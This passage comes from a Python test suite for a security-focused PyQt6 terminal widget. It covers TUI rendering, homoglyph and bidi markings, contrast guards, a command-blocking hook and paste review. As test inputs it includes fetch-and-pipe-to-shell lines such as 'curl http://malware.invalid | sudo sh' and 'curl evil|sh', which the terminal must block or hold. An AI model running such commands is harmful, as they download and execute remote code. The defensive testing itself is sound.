ok(_gcols * _gcw <= gz.viewport().width() - 2 * _gmargin + _gvbar,
   'the TUI grid columns fit the text area, so the grid never overflows sideways')
# --- TUI is a full emulator: primary-screen redraws (completion menus), CLI<->TUI
# scrollback, and full-screen apps all render (only where pyte is installed) ------
if tui_available():
    # a completion-menu style cursor-up redraw OVERWRITES the listing line instead
    # of piling up (the whole point of #184: the grid honours cursor-up)
    _mprog = os.path.join(tempfile.mkdtemp(prefix='st-menu-'), 'menu.sh')
    with open(_mprog, 'w') as _f:
        _f.write('#!/bin/sh\n'
                 'printf "prompt> cd \\n"\n'
                 'printf "dirA  dirB\\n"\n'
                 'printf "\\033[Aprompt> cd dirA\\033[K\\n"\n'   # cursor up + redraw
                 'sleep 3\n')
    os.chmod(_mprog, 0o700)
    _mt = SecureTerminal(command=_mprog, tui=True)
    _mt.resize(600, 300)
    _mt.show()
    pump(400)
    _mlines = [ln.rstrip() for ln in _mt.toPlainText().split('\n') if ln.strip()]
    ok('prompt> cd dirA' in _mlines and 'dirA  dirB' not in _mlines,
       'a cursor-up redraw (completion menu) overwrites in the grid, not piles up')
    # CLI->TUI keeps the scrollback (seeded from retained output), and TUI->CLI
    # keeps the output produced while in TUI
    _hprog = os.path.join(tempfile.mkdtemp(prefix='st-hist-'), 'h.sh')
    with open(_hprog, 'w') as _f:
        _f.write('#!/bin/sh\nfor i in 1 2 3 4 5; do echo "scrollback-$i"; done\nsleep 3\n')
    os.chmod(_hprog, 0o700)
    _ht = SecureTerminal(command=_hprog)          # start in CLI
    _ht.resize(600, 300)
    _ht.show()
    pump(400)
    ok('scrollback-3' in _ht.toPlainText(), 'output present in CLI mode')
    _ht.apply_tui(True)
    pump(120)
    ok('scrollback-3' in _ht.toPlainText(),
       'CLI->TUI keeps the scrollback (grid seeded from retained output)')
    # a full-screen program (alternate screen) is restored on exit: its frame does
    # not pollute the scrollback and the pre-program screen comes back
    _fprog = os.path.join(tempfile.mkdtemp(prefix='st-fs-'), 'fs.sh')
    with open(_fprog, 'w') as _f:
        _f.write('#!/bin/sh\n'
                 'echo primary-content\n'
                 'sleep 0.3\n'
                 'printf "\\033[?1049h\\033[2J\\033[HFULLSCREEN-FRAME"\n'
                 'sleep 0.4\n'
                 'printf "\\033[?1049l"\n'
                 'sleep 3\n')
    os.chmod(_fprog, 0o700)
    _ft = SecureTerminal(command=_fprog, tui=True)
    _ft.resize(600, 300)
    _ft.show()
    pump(1100)
    _ftext = _ft.toPlainText()
    ok('FULLSCREEN-FRAME' not in _ftext,
       'a full-screen program frame does not pollute the scrollback on exit')
    ok('primary-content' in _ftext,
       'the pre-program primary screen is restored when a full-screen app exits')
    # a tab that STARTS in TUI with restored scrollback keeps it, sets grid state,
    # and rebuilds the line document when switched to CLI (codex P1).
    _st = SecureTerminal(command='/bin/cat', tui=True, history='restored-scrollback\n')
    _st.resize(600, 300)
    _st.show()
    pump(120)
    ok(_st._grid_shown and 'restored-scrollback' in _st.toPlainText(),
       'a tab starting in TUI seeds its restored scrollback into the grid')
    _st.apply_tui(False)
    pump(60)
    ok('restored-scrollback' in _st.toPlainText(),
       'switching a TUI-started tab to CLI rebuilds the line document (keeps history)')
    # the shell's prompt that arrives in the SAME read as the alt-screen leave is
    # fed onto the restored primary, not discarded (codex P1).
    _pprog = os.path.join(tempfile.mkdtemp(prefix='st-lp-'), 'lp.sh')
    with open(_pprog, 'w') as _f:
        _f.write('#!/bin/sh\n'
                 'sleep 0.2\n'
                 'printf "\\033[?1049h\\033[2J\\033[HAPP"\n'
                 'sleep 0.3\n'
                 'printf "\\033[?1049lPROMPT-AFTER-LEAVE\\$ "\n'
                 'sleep 3\n')
    os.chmod(_pprog, 0o700)
    _pt = SecureTerminal(command=_pprog, tui=True)
    _pt.resize(600, 300)
    _pt.show()
    pump(900)
    ok('PROMPT-AFTER-LEAVE' in _pt.toPlainText(),
       'bytes after an alt-screen leave (the next prompt) land on the restored screen')
    # a scrollback cap smaller than the grid must not wipe the document (codex P2:
    # _grid_rows tracks ACTUAL blocks, so _delete_grid never goes negative).
    _tt = SecureTerminal(command='/bin/cat', tui=True)
    _tt.apply_scrollback(5)                # far smaller than the grid's row count
    _tt.resize(600, 400)
    _tt.show()
    pump(60)
    for _i in range(30):
        _tt._feed_stream(('grid-line-%d\r\n' % _i).encode())
    _tt._render_tui()                      # must not crash or blank the document
    ok(_tt.document().blockCount() >= 1 and _tt._grid_rows <= _tt.document().blockCount(),
       'a tiny scrollback cap does not corrupt the grid render')
    # the alt-screen split loop in _feed_stream always terminates: each iteration
    # advances past a marker (>= 6 bytes) or to the end -- feed pathological input
    # (back-to-back and empty-segment markers) and it must not hang or crash.
    _at = SecureTerminal(command='/bin/cat', tui=True)
    _at.resize(400, 200)
    _mk = [b'\x1b[?1049h', b'\x1b[?1049l', b'\x1b[?47h', b'\x1b[?47l']
    for _combo in (b''.join(_mk), b''.join(_mk * 3), b'x' + b''.join(_mk) + b'y',
                   b'\x1b[?1049h\x1b[?1049h\x1b[?1049l', b'', b'\x1b[?10', b'49h'):
        _at._feed_stream(_combo)          # returns (bounded) or the test would hang
    _at._render_tui()
    ok(_at.document().blockCount() >= 1,
       'the alt-screen split feed loop terminates on pathological marker input')
    # window resize keeps the pyte grid and the pty winsize in step (SIGWINCH), so
    # a TUI program repaints at the new width, and resizing while scrolled up does
    # not crash the incremental renderer.
    import fcntl as _fcntl, termios as _termios, struct as _struct     # noqa: E402
    _rt = SecureTerminal(command='/bin/cat', tui=True)
    _rt.resize(500, 300)
    _rt.show()
    pump(60)
    _small = _rt._screen.columns
    _rt.resize(1100, 600)
    pump(60)
    _grown = _rt._screen.columns
    _ws = _struct.unpack('HHHH', _fcntl.ioctl(
        _rt._fd, _termios.TIOCGWINSZ, _struct.pack('HHHH', 0, 0, 0, 0)))
    ok(_grown > _small and _ws[1] == _grown,
       'resize grows the pyte grid and updates the pty winsize (cols) together')
    for _i in range(200):
        _rt._feed_stream(('rsb-%d\r\n' % _i).encode())
    _rt._render_tui()
    _rbar = _rt.verticalScrollBar()
    _rbar.setValue(_rbar.maximum() // 2)
    _rt.resize(700, 450)               # resize while scrolled up: must not crash
    pump(40)
    ok(_rt.document().blockCount() >= 1, 'resizing while scrolled up does not crash')

    # Bug #64: the primary-screen grid trims trailing blank rows below the cursor,
    # so the document ends at the last output line (no scrolling into empty space).
    _pad = SecureTerminal(command='/bin/cat', tui=True)
    _pad.resize(700, 400)
    _pad.show()
    pump(40)
    _pad.apply_mode('show')
    _pad._feed_stream(b'\x1b[2J\x1b[1;1Hline1\r\nline2\r\nprompt$ ')
    _pad._render_tui()
    ok(_pad.toPlainText().split('\n')[-1].startswith('prompt$'),
       'TUI document ends at the last output line, no blank grid padding below it')
    ok(_pad.document().blockCount() <= 4,
       'TUI grid is trimmed to the cursor row, not the full screen height')
    _pad.close()

    # Bug #65: TUI auto-scrolls to the newest output when already at the bottom, but
    # does NOT yank a scrolled-up view back down.
    _fol = SecureTerminal(command='/bin/cat', tui=True)
    _fol.resize(700, 300)
    _fol.show()
    pump(40)
    for _i in range(80):
        _fol._feed_stream(('scrollback-%d\r\n' % _i).encode())
    _fol._render_tui()
    _fbar = _fol.verticalScrollBar()
    ok(_fbar.maximum() > 0, 'TUI scrollbar has range (content exceeds the viewport)')
    _fbar.setValue(_fbar.maximum())
    _fol._feed_stream(b'newest-line\r\n')
    _fol._render_tui()
    eq(_fbar.value(), _fbar.maximum(),
       'TUI auto-scrolls to the newest output when already at the bottom')
    _fbar.setValue(_fbar.maximum() // 2)
    _held = _fbar.value()
    _fol._feed_stream(b'more-output\r\n')
    _fol._render_tui()
    eq(_fbar.value(), _held,
       'TUI does not yank a scrolled-up view back to the bottom')
    _fol.close()
# Ctrl+C is echoed locally as ^C (transparency: make the invisible visible) and
# de-duped against a shell that also echoes it (bash's readline), so the user
# always sees exactly one ^C.
cc = SecureTerminal(command='/bin/cat')
cc._feed_line('prompt$ ')
key(cc, Qt.Key.Key_C, mods=Qt.KeyboardModifier.ControlModifier)
ok(cc.toPlainText().endswith('^C'), 'Ctrl+C is locally echoed as ^C')
_dedup = cc._absorb_caret('^C\r\nprompt$ ')          # bash's own ^C, right after
ok(not _dedup.startswith('^C'), 'a shell duplicate ^C in the next output is absorbed')
cc._feed_line(_S.render_output(_dedup, cc.current_mode()))
eq(cc.toPlainText().count('^C'), 1, 'exactly one ^C after Ctrl+C + shell echo (no double)')
cz = SecureTerminal(command='/bin/cat')
cz._feed_line('prompt%')
key(cz, Qt.Key.Key_C, mods=Qt.KeyboardModifier.ControlModifier)
_z = cz._absorb_caret('\r\nprompt%')                 # a shell (zsh) that echoes nothing
ok('^C' not in _z, 'nothing removed when the shell does not echo ^C')
eq(cz.toPlainText().count('^C'), 1, 'local ^C preserved for a non-echoing shell')

# a restored session tab spawns its shell in the SAVED working directory (cwd),
# so restore returns you to where you were (bug: pwd was not restored).
import tempfile as _tfcwd                                  # noqa: E402


def _wait_cwd(pid, target, tries=60):
    _rt = os.path.realpath(target)
    for _ in range(tries):
        try:
            if os.path.realpath(os.readlink('/proc/%d/cwd' % pid)) == _rt:
                return True
        except OSError:
            pass
        pump(10)                       # let the forked child chdir + exec
    return False


_cwd_dir = _tfcwd.mkdtemp(prefix='st-cwd-')
_cwt = SecureTerminal(command='/bin/cat', cwd=_cwd_dir)
ok(_wait_cwd(_cwt._pid, _cwd_dir), 'a spawned shell starts in the requested cwd')
eq(os.path.realpath(_cwt.shell_cwd()), os.path.realpath(_cwd_dir),
   'shell_cwd reports the shell working directory')
_cwt.close()
# a vanished cwd must not break the spawn -- it falls back to the inherited dir
_gone = _tfcwd.mkdtemp(prefix='st-gone-')
os.rmdir(_gone)
_cwg = SecureTerminal(command='/bin/cat', cwd=_gone)
pump(30)
ok(_cwg._pid is not None, 'a vanished saved cwd still spawns a shell (fallback)')
_cwg.close()
# shell_cwd returns '' when the shell pid is gone / unreadable (defensive branch)
_cwt2 = SecureTerminal(command='/bin/cat')
_realpid = _cwt2._pid
_cwt2._pid = 2 ** 30           # a pid that does not exist -> os.readlink raises
eq(_cwt2.shell_cwd(), '', 'shell_cwd returns empty when the shell pid is unreadable')
_cwt2._pid = _realpid          # restore so close() reaps the real child
_cwt2.close()
# regression: output that fills the reported width hard-wraps (real autowrap), so
# a shell's width-padded end-of-line marker (zsh PROMPT_SP / PROMPT_EOL_MARK) and
# the following prompt do not collapse onto one logical line -- which lost the
# last line of a file printed without a trailing newline.
aw = SecureTerminal(command='/bin/cat')
aw._cols = 40
aw._feed_line('END}' + '%' * 40 + '\rprompt$ ')      # }, a width-filling marker, CR, prompt
_awlines = aw.toPlainText().split('\n')
ok(any('END}' in ln for ln in _awlines),
   'content before a width-filling marker survives (autowrap, not collapse)')
ok(len(_awlines) >= 2,
   'output filling the reported width hard-wraps instead of collapsing under a bare CR')
# and a soft-autowrapped line copies JOINED (no spurious newline at the wrap),
# like a real terminal -- the wrap-continuation block is marked and joined.
cwp = SecureTerminal(command='/bin/cat')
cwp._cols = 5
cwp._feed_line('abcdefgh\n')                          # 8 chars at width 5 -> wraps
cwp.selectAll()
_copied = cwp.createMimeDataFromSelection().text()
ok('abcdefgh' in _copied, 'a soft-wrapped line copies joined (no wrap newline)')
ok('abcde\nfgh' not in _copied, 'the wrap point is not a newline in the copy')
# copying a slice that starts AFTER an astral char must land on the right cell:
# QTextCursor positions are UTF-16 units (an astral glyph is two), so a Python
# str-offset slice would mis-cut. Show mode keeps the glyph as one code point.
cap = SecureTerminal(command='/bin/cat')
cap.apply_mode('show')
cap._feed_line('\U0001f600X\n')                      # emoji (2 UTF-16 units) + X
_capcur = cap.textCursor()
_capcur.setPosition(2)                                # just past the emoji
_capcur.setPosition(3, QTextCursor.MoveMode.KeepAnchor)
cap.setTextCursor(_capcur)
ok(cap.createMimeDataFromSelection().text() == 'X',
   'a selection after an astral char copies the right cell (UTF-16 aware)')
# gap1 (ai-review): the PRIMARY-selection / drag path strips to ASCII even in Show
# mode -- a homoglyph must not reach a middle-click paste / drop target unreviewed
# (the copy review only covers Ctrl+C).
_prim = SecureTerminal(command='/bin/cat')
_prim.apply_mode('show')
_prim._feed_line('pa' + chr(0x0430) + 'l\n')          # Cyrillic 'a' homoglyph kept in Show
_pcur = _prim.textCursor()
_pcur.setPosition(0)
_pcur.setPosition(4, QTextCursor.MoveMode.KeepAnchor)
_prim.setTextCursor(_pcur)
ok(all(ord(c) < 128 for c in _prim.createMimeDataFromSelection().text()),
   'gap1: the PRIMARY-selection/drag path strips non-ASCII (no unreviewed homoglyph)')
_prim.close()
# --- inspect popups: a marked character carries its source codepoint, so the
# hover tooltip and the double-click popup can describe it in EVERY mode ---------
from secure_terminal.terminal import _CP_PROP            # noqa: E402
from PyQt6.QtWidgets import QLabel, QPushButton           # noqa: E402
from PyQt6.QtGui import QGuiApplication                   # noqa: E402


def _fmt_cp(term, index):
    _c = QTextCursor(term.document())
    _c.setPosition(index)
    _c.movePosition(QTextCursor.MoveOperation.NextCharacter,
                    QTextCursor.MoveMode.KeepAnchor)
    return _c.charFormat().property(_CP_PROP)


ins = SecureTerminal(command='/bin/cat')
ins.apply_mode('box')
ins._append('a' + chr(0x202E) + 'b')                     # RLO between two ASCII
eq(ins.toPlainText(), 'a_b', 'box shows the RLO override as "_"')
eq(_fmt_cp(ins, 1), 0x202E, 'even the box "_" carries the source codepoint (RLO)')
inr = SecureTerminal(command='/bin/cat')
inr.apply_mode('reveal')
inr._append(chr(0x20AC))                                 # euro sign
eq(_fmt_cp(inr, 0), 0x20AC, 'a reveal badge carries the source codepoint (euro)')
# _cp_at (the real hover/click hit-test) recovers it from a viewport point. The
# badge is 8 cells wide and every cell carries the tag, so a mid-badge point is a
# stable target regardless of exact glyph metrics.
inr.resize(600, 200)
inr.show()
pump(30)
_mid = QTextCursor(inr.document())
_mid.setPosition(4)                                      # inside "<U+20AC>"
_badge_pt = inr.cursorRect(_mid).center()
eq(inr._cp_at(_badge_pt), 0x20AC, '_cp_at recovers the codepoint under a point (reveal)')
# and in SHOW mode a readable glyph keeps no tag but IS its own codepoint: _cp_at
# falls back to the character itself (three copies give a stable mid target).
insh = SecureTerminal(command='/bin/cat')
insh.apply_mode('show')
insh._append(chr(0x0416) * 3)                            # Cyrillic Zhe, printable
insh.resize(600, 200)
insh.show()
pump(30)
_shcur = QTextCursor(insh.document())
_shcur.setPosition(1)
eq(insh._cp_at(insh.cursorRect(_shcur).center()), 0x0416,
   '_cp_at reads a shown glyph via its own codepoint (show mode, no tag)')
# markings off + ANSI colours on: the marking keeps the program's own foreground
# (not dropped to a blank format) and still carries the codepoint (codex P2 fix).
from PyQt6.QtCore import QPoint                           # noqa: E402
_sgrk = tuple(sorted({'fg': 1, 'bg': None, 'bold': False}.items()))
_mfmt = SecureTerminal(command='/bin/cat')._fmt_from_key((_S.MARK_KEY, _sgrk, 0x202E))
eq(_mfmt.foreground().color().name(), '#cd0000',
   'markings off + colours on keeps the program ANSI colour on the marking')
eq(_mfmt.property(_CP_PROP), 0x202E, 'and the marking still carries the codepoint')
# the hit-test targets ONLY the character under the point, never its neighbour: a
# point over "_" reads the RLO, a point over the adjacent ASCII reads nothing
# (codex P2: probing both sides bled the popup into adjacent glyphs).
inb = SecureTerminal(command='/bin/cat')
inb.apply_mode('box')
inb._append('a' + chr(0x202E) + 'b')                     # -> 'a_b'
inb.resize(600, 200)
inb.show()
pump(30)


def _midpt(term, i):
    _c0 = QTextCursor(term.document())
    _c0.setPosition(i)
    _c1 = QTextCursor(term.document())
    _c1.setPosition(i + 1)
    _r0 = term.cursorRect(_c0)
    _r1 = term.cursorRect(_c1)
    return QPoint((_r0.x() + _r1.x()) // 2, _r0.center().y())


eq(inb._cp_at(_midpt(inb, 1)), 0x202E, 'a point over "_" reads the RLO codepoint')
ok(inb._cp_at(_midpt(inb, 0)) is None, 'a point over the adjacent "a" is not the marking')
ok(inb._cp_at(_midpt(inb, 2)) is None, 'a point over the adjacent "b" is not the marking')
# an astral glyph (2 UTF-16 units) in show mode is hit-tested as ONE character:
# the whole code point, never a lone surrogate half (codex P2 fix).
ina = SecureTerminal(command='/bin/cat')
ina.apply_mode('show')
ina._append('x' + chr(0x1F600) + 'y')                    # emoji between two ASCII
ina.resize(600, 200)
ina.show()
pump(30)
_ea = QTextCursor(ina.document())
_ea.setPosition(1)                                       # boundary before the emoji
_eb = QTextCursor(ina.document())
_eb.setPosition(3)                                       # boundary after its 2 units
_emid = QPoint((ina.cursorRect(_ea).x() + ina.cursorRect(_eb).x()) // 2,
               ina.cursorRect(_ea).center().y())
eq(ina._cp_at(_emid), 0x1F600, 'a whole astral glyph is recovered (not a lone surrogate)')
# the active popup describes the character and copies its ESCAPE (never the raw
# glyph -- putting a bidi override / homoglyph on the clipboard is the hazard).
ins._show_char_popup(0x202E, ins.mapToGlobal(ins.rect().center()))
eq(ins._char_popup.windowTitle(), 'Character U+202E', 'popup is titled by codepoint')
_lbl = ins._char_popup.findChild(QLabel)
ok('RIGHT-TO-LEFT OVERRIDE' in _lbl.text() and 'bidirectional' in _lbl.text(),
   'popup names the character and its risk class')
_copy = [b for b in ins._char_popup.findChildren(QPushButton)
         if b.text().startswith('Copy')][0]
_copy.click()
eq(QGuiApplication.clipboard().text(), '\\u202e',
   'copy puts the \\uXXXX escape (not the raw glyph) on the clipboard')
ins._char_popup.close()
# a double-click on a marking opens its popup; elsewhere it falls through
_dc = []
ins._show_char_popup = lambda cp, pt: _dc.append(cp)
ins._cp_at = lambda pos: 0x202E
_dbl = QMouseEvent(QEvent.Type.MouseButtonDblClick, QPointF(5, 5), QPointF(5, 5),
                   Qt.MouseButton.LeftButton, Qt.MouseButton.LeftButton,
                   Qt.KeyboardModifier.NoModifier)
ins.mouseDoubleClickEvent(_dbl)
eq(_dc, [0x202E], 'double-click on a marking opens its inspection popup')
# command hook: judge the typed line before Enter submits it. The terminal here
# runs /bin/cat, which only echoes -- no typed string is ever executed.
hk = SecureTerminal(command='/bin/cat')
_handler = [sys.executable, '-c',
            'import sys, json\n'
            + 'c = json.load(sys.stdin)["command"]\n'
            + 'print(json.dumps({"verdict": "block", "message": "no",'
            + ' "suggestion": "ls"} if "sudo sh" in c else {"verdict": "allow"}))']
hk.apply_hook({'argv': _handler, 'timeout': 10, 'on_error': 'allow',
               'transcript': 'none'})
_hsent = spy_writes(hk)
_hnotes = []
hk.hook_notice.connect(_hnotes.append)


def _htype(term, text):
    for _ch in text:
        key(term, Qt.Key.Key_A, _ch)


_htype(hk, 'ls')
key(hk, Qt.Key.Key_Return)
ok(b'\r' in _hsent, 'hook allows a safe command (Enter submits)')
_hsent.clear()
hk._hook_ask = lambda _c, _r: 'discard'          # decline the block dialog
_htype(hk, 'curl http://malware.invalid | sudo sh')   # harmless illustration
key(hk, Qt.Key.Key_Return)
ok(b'\r' not in _hsent and b'\x15' in _hsent,
   'hook blocks: not submitted, typed line discarded (Ctrl+U)')
ok(_hnotes and _hnotes[-1] == 'no', 'hook advisory surfaced')
# history recall desyncs the hook's view of the line, so it must FAIL SAFE (ask),
# not judge a stale/empty buffer and wave a recalled command through.
_hsent.clear()
_asked = []
hk._hook_ask = lambda _c, _r: (_asked.append(_r['message']) or 'discard')
key(hk, Qt.Key.Key_Up)                 # recall from history -> buffer now stale
ok(hk._line_dirty, 'a history/edit key marks the line unverifiable for the hook')
key(hk, Qt.Key.Key_Return)
ok(_asked and b'\x15' in _hsent and b'\r' not in _hsent,
   'edited line: hook asks and (on decline) discards, never submits unjudged')
ok(not hk._line_dirty, 'dirty flag cleared after the decision')
# defense-in-depth: the hook layer single-lines a suggestion upstream, but the
# widget also strips CR/LF at the write site, so even a suggestion that somehow
# carried a newline can never auto-submit.
import secure_terminal.hook as _hookmod              # noqa: E402
_real_evaluate = _hookmod.evaluate
_hookmod.evaluate = lambda *a, **k: {
    'verdict': 'block', 'message': '', 'suggestion': 'evil\ncmd\rtail'}
try:
    hk._hook_ask = lambda _c, _r: 'suggest'
    _hsent.clear()
    _htype(hk, 'x')
    key(hk, Qt.Key.Key_Return)
    _written = b''.join(_hsent)
    ok(b'\n' not in _written and b'\r' not in _written,
       'hook suggestion write strips CR/LF: a newline suggestion cannot auto-run')
    eq(hk._line_buffer, 'evil cmd tail',
       'the inserted suggestion is single-lined at the write site')
finally:
    _hookmod.evaluate = _real_evaluate

# --- colours: SGR run formatting + contrast guard -----------------------------
from PyQt6.QtGui import QTextCursor as _QTC              # noqa: E402


def _fmt_of_char(term, ch):
    doc = term.toPlainText()
    idx = doc.index(ch)
    cur = term.textCursor()
    cur.setPosition(idx)
    cur.setPosition(idx + 1, _QTC.MoveMode.KeepAnchor)
    return cur.charFormat()


col = SecureTerminal(command='/bin/cat')
col.apply_colors(True)
col.apply_theme('dark')
col._append('\x1b[31mR\x1b[0m')          # red R via SGR, through the cell model
eq(_fmt_of_char(col, 'R').foreground().color().name(), '#cd0000', 'red run fg')
col2 = SecureTerminal(command='/bin/cat')
col2.apply_colors(True)
col2.apply_theme('dark')
col2._append('\x1b[30mH\x1b[0m')         # black-on-dark must be contrast-guarded
ok(_fmt_of_char(col2, 'H').foreground().color().name() != '#000000',
   'black-on-dark guarded')

# --- leftover colour must not bleed into the shell's next prompt --------------
# A program (here a hostile log) sets a background colour and exits WITHOUT
# resetting it. A normal terminal leaves that colour "stuck", so the shell's next
# prompt inherits it. secure-terminal resets the leftover at the prompt boundary
# (the bracketed-paste marker every shell line editor emits before a prompt), so
# the prompt renders on the default background -- while the program's OWN coloured
# output is untouched (shown, contrast-guarded, not stripped). This is the FULL
# _on_readable path (feed_output), where the reset injection lives; earlier tests
# only fed one-shot streams with no following prompt, so this case was uncovered.
lo = SecureTerminal(command='/bin/cat')
lo.apply_colors(True)
lo.apply_theme('dark')
feed_output(lo, b'\x1b[31;41mALERT\n\x1b[?2004hPS> ')
_alert_bg = _fmt_of_char(lo, 'A').background()
ok(_alert_bg.style() != Qt.BrushStyle.NoBrush,
   'leftover colour: the program\'s own background colour is preserved (shown)')
_prompt_bg = _fmt_of_char(lo, 'P').background()
ok(_prompt_bg.style() == Qt.BrushStyle.NoBrush
   or _prompt_bg.color().name() != _alert_bg.color().name(),
   'leftover colour: the prompt after the marker is NOT on the stuck background')
# without the marker the stream is unchanged (shells that do not use bracketed
# paste keep the old readable-but-stuck behaviour; no spurious reset injected).
eq(lo._reset_leftover_sgr('\x1b[41mx'), '\x1b[41mx',
   'leftover colour: no prompt marker -> stream passes through unchanged')
eq(lo._reset_leftover_sgr('out\x1b[?2004hPS> '),
   'out\x1b[0m\x1b[?2004hPS> ',
   'leftover colour: an SGR reset is injected at the prompt marker')

# --- a prompt after output with NO trailing newline starts on a fresh line ----
# `head -c N /dev/urandom` emits no trailing newline, so stock bash glues its
# next prompt onto the last output byte. At the prompt-start marker, end that
# mid-line so the prompt gets its own line -- and do nothing when already at
# column 0 (e.g. output that ended in a newline, or zsh's PROMPT_SP).
_DFLT = {'fg': None, 'bg': None, 'bold': False}
_nc, _nk, _, _, _ = _S.feed_line_edits([], 0, dict(_DFLT), 'abc' + _S.PROMPT_START + 'PS> ')
eq([''.join(c for c, _ in ln) for ln in _nc], ['abc'],
   'prompt newline: un-terminated output before the marker is ended into its line')
eq(''.join(c for c, _ in _nk), 'PS> ',
   'prompt newline: the prompt starts on a fresh line, not glued to the output')
_zc, _zk, _, _, _ = _S.feed_line_edits([], 0, dict(_DFLT), 'abc\n' + _S.PROMPT_START + 'PS> ')
eq([''.join(c for c, _ in ln) for ln in _zc], ['abc'],
   'prompt newline: a trailing newline already ended the line -- no spurious blank')
# zsh/zle emits the bracketed-paste marker AFTER printing the prompt (bash sends
# it before). With no printable text after the marker the prompt is already on
# the row, so flushing here would push it onto its own line and drop the cursor
# below it (the reported bug). It must NOT be flushed.
_zsh_raw = '[user ~]% ' + _S.PROMPT_START
_zshc, _zshk, _zshcol, _, _ = _S.feed_line_edits([], 0, dict(_DFLT), _zsh_raw)
eq([''.join(c for c, _ in ln) for ln in _zshc], [],
   'zsh prompt: a marker AFTER the prompt does not flush the prompt onto its own line')
eq(''.join(c for c, _ in _zshk), '[user ~]% ',
   'zsh prompt: the prompt stays on the current row with the cursor after it')
eq(_zshcol, len('[user ~]% '), 'zsh prompt: the cursor column is at the prompt end')
# still not flushed when only escapes (no printable text) follow the marker
_zec, _zek, _, _, _ = _S.feed_line_edits(
    [], 0, dict(_DFLT), '[user ~]% ' + _S.PROMPT_START + '\x1b[0m')
eq(''.join(c for c, _ in _zek), '[user ~]% ',
   'zsh prompt: a trailing SGR after the marker still does not flush')

# --- security: an app cannot recolour or HIDE a neutralised marking -----------
# A marking (the box glyph, or a Reveal/Detail <U+XXXX> badge -- same key, so the
# same rules across every display mode). With coloured markings ON (default) it
# is coloured by its RISK CLASS, never by the SGR an app set around it, so hostile
# output can neither recolour a box to blend in nor forge one. With markings OFF
# (app colours on) a box takes the app colour but through the contrast guard, so
# it still cannot be painted invisible.
mk = SecureTerminal(command='/bin/cat')
mk.apply_colors(True)
mk.apply_theme('dark')
_bidi = (_S.MARK_KEY, 'bidi', 0x202E)                 # a RIGHT-TO-LEFT OVERRIDE
eq(mk._fmt_from_key(_bidi).foreground().color().name(), mk.MARKING_COLORS['bidi'],
   'marking: coloured by risk class (bidi), an app cannot recolour it')
ok(mk._fmt_from_key(_bidi).background().style() == Qt.BrushStyle.NoBrush,
   'marking: no app background is applied -- the box shows on the default bg')
_risk_classes = ('bidi', 'invisible', 'control', 'nonascii', 'confusable')
_risk_cols = [mk._fmt_from_key((_S.MARK_KEY, c, 0x41)).foreground().color().name()
              for c in _risk_classes]
eq(len(set(_risk_cols)), len(_risk_classes),
   'marking: the five risk classes get five distinct colours')
ok(all(c in mk.MARKING_COLORS for c in _risk_classes),
   'marking: every risk class has a configured colour')
# a homoglyph (confusable) is flagged in a DIFFERENT colour than honest foreign text
ok(mk.MARKING_COLORS['confusable'] != mk.MARKING_COLORS['nonascii'],
   'marking: a look-alike (confusable) is louder than plain non-ASCII, not the same colour')
# markings OFF: the box carries the app's own SGR -- an app trying to hide it by
# painting it its background colour is still forced readable by the contrast guard.
_hide = tuple(sorted({'fg': 0, 'bg': 0, 'bold': False}.items()))    # black-on-black
_hf = mk._fmt_from_key((_S.MARK_KEY, _hide, 0x202E))
ok(_hf.background().style() == Qt.BrushStyle.NoBrush
   or _hf.foreground().color().name() != _hf.background().color().name(),
   'marking: an app colour on a box is contrast-guarded -- fg never equals bg')

# --- every theme: risk-class marking colours stay readable, and a hide attempt
# --- is guarded regardless of theme -------------------------------------------
# The risk colours are fixed (not theme-derived), so they must read on BOTH theme
# backgrounds -- the MARKING_COLORS comment claims "chosen to read on both the
# light and dark themes", pinned here. And the box-hiding guard must hold in every
# theme, not just dark (the contrast-guard sweeps elsewhere already cover both).
from secure_terminal.terminal import THEMES as _THEMES2, _rgb as _rgb4   # noqa: E402
from secure_terminal.sanitize import too_close as _tc4                   # noqa: E402
from PyQt6.QtGui import QColor as _QC4                                    # noqa: E402
_thmk = SecureTerminal(command='/bin/cat')
_thmk.apply_colors(True)
for _theme in ('dark', 'light'):
    _thmk.apply_theme(_theme)
    _bg_rgb = _rgb4(_QC4(_THEMES2[_theme][0]))
    for _cls, _hex in _thmk.MARKING_COLORS.items():
        ok(not _tc4(_rgb4(_QC4(_hex)), _bg_rgb),
           'marking colour %s reads on the %s theme background' % (_cls, _theme))
    # a program painting a box its own bg colour is forced readable in this theme
    for _c in (0, 7, 15):
        _hk = tuple(sorted({'fg': _c, 'bg': _c, 'bold': False}.items()))
        _hfmt = _thmk._fmt_from_key((_S.MARK_KEY, _hk, 0x202E))
        _fg = _rgb4(_hfmt.foreground().color())
        _bgb = _hfmt.background()
        _bg = _rgb4(_bgb.color()) if _bgb.style() != Qt.BrushStyle.NoBrush else _bg_rgb
        ok(not _tc4(_fg, _bg),
           'hide attempt (palette %d on itself) is contrast-guarded on the %s theme'
           % (_c, _theme))
# apply_theme sets the expected base palette for each theme
for _theme, _base in (('dark', '#14161b'), ('light', '#ffffff')):
    _thmk.apply_theme(_theme)
    eq(_thmk.palette().color(_thmk.palette().ColorRole.Base).name(), _base,
       'apply_theme sets the %s base background' % _theme)

# --- paste gating (async review: hold, then dispatch a choice) ----------------
p = SecureTerminal(command='/bin/cat')
psent = spy_writes(p)
# a risky paste is HELD and a review requested; nothing is sent until a choice is
# dispatched (no blocking modal). Track the requests via the signal.
_reviews = []
p.paste_review_requested.connect(lambda raw, delay: _reviews.append((raw, delay)))
mime = QMimeData()
mime.setText('echo hi\n')
p.insertFromMimeData(mime)
eq(psent, [b'echo hi\r'], 'clean paste sent directly')
eq(_reviews, [], 'a clean paste raises no review')
psent.clear()
# F3: a MULTI-LINE plain-ASCII paste is held for review too, so a hidden second
# command cannot run the instant you paste (default 'unicode' warn mode).
mime_ml = QMimeData()
mime_ml.setText('echo ok\ncurl evil|sh\n')
p.insertFromMimeData(mime_ml)
eq(psent, [], 'F3: a multi-line ASCII paste is held -- nothing reaches the shell yet')
ok(p.review_pending() and len(_reviews) == 1,
   'F3: a multi-line plain-ASCII paste raises a review (pastejacking held)')
p.dispatch_pending_paste('reject')
_reviews.clear()
psent.clear()
# a paste with a homoglyph (Cyrillic a) plus a bidi override: held for review
mime2 = QMimeData()
mime2.setText('pay' + chr(0x0430) + 'l' + chr(0x202E) + '\n')
p.insertFromMimeData(mime2)
eq(psent, [], 'a risky paste is held -- nothing reaches the shell until a choice')
ok(p.review_pending() and len(_reviews) == 1, 'a risky paste raises exactly one review')
# reject -> nothing sent, pending cleared
p.dispatch_pending_paste('reject')
eq(psent, [], 'rejected paste sends nothing')
ok(not p.review_pending(), 'reject clears the held paste')
